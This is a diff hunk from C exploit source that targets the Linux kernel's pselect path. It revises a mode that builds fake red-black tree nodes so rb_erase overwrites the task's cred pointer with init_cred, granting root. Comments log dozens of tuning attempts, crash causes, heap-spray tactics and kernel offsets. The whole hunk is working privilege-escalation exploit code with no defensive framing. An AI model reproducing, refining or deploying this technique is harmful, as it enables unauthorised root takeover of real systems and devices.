@@ -936,19 +936,18 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
             }
           } else if (env_flag("MODE4_SLIDE_CRED", 0)) {
             /*
-             * *task.cred = init_cred (or sprayed copy). only-left:
-             *   pc = VALUE, left = cred_slot, right = 0
-             * child->__rb_parent_color writes VALUE into *slot.
-             * change_child extra store is at VALUE+8 (init_cred.gid if
-             * uid@+4) — not selinux_state. Z16 died on a second KS spray
-             * after park; this walk is spray-free BSS overlay like W1.
+             * *task.cred = init_cred — CLASSIC only-right store (08-31):
+             * the previous only-left shape (pc=VALUE, left=slot) never
+             * landed once in ~84 beacon-verified attempts, while the
+             * same-walk W1 leaf-NULL (parent=slot-8) lands every clean
+             * boot. Same family as W1 but with a child: the erased node
+             * carries right=init_cred, so rb_erase's __rb_change_child
+             * stores the child into *(parent+8) = *cred_slot.
+             * Side effect (accepted, Z-era): rb_set_parent_color writes
+             * pc into init_cred+0 (usage counter).
              */
             {
               uint64_t ztgt = (uint64_t)pselect_write_target();
-              /* Z22/Z24: BSS-zero as cred lived the walk then panicked
-               * (user_ns NULL). Z17 init_cred KP used dirty W1 lock;
-               * retry init_cred with BSS tail lock. gid/suid at +8/+12
-               * are 0 → rb left/right 0. */
               uint64_t ic_off =
                   (active_offsets && active_offsets->off_init_cred)
                       ? (uint64_t)active_offsets->off_init_cred
@@ -961,9 +960,10 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                   (active_offsets && active_offsets->off_init_task)
                       ? (uint64_t)active_offsets->off_init_task
                       : (uint64_t)INIT_TASK_OFF;
-              tree_pc = val & ~1ULL;
-              tree_r = 0;
-              tree_l = ztgt;
+              tree_pc = (ztgt - 8) & ~3ULL;
+              tree_pc |= 1ULL; /* black — reduce rebalance pressure */
+              tree_r = val;
+              tree_l = 0;
               pi_parent = 0;
               pi_right = 0;
               pi_left = 0;
@@ -974,10 +974,11 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                        : 0x02BB9D00ULL));
               stack_prio = 3;
               stack_deadline = 0;
-              pr_info("stack mode4 SLIDE_CRED: *%016llx = %016llx "
-                      "(%s) BSS tail lock\n",
+              pr_info("stack SLIDE_CRED classic only-right: *%016llx = "
+                      "%016llx (%s) parent=%016llx\n",
                       (unsigned long long)ztgt, (unsigned long long)val,
-                      g_cred_copy ? "cred_copy" : "init_cred");
+                      g_cred_copy ? "cred_copy" : "init_cred",
+                      (unsigned long long)tree_pc);
             }
           } else if (env_flag("MODE4_SLIDE_ZERO", 0)) {
             /*
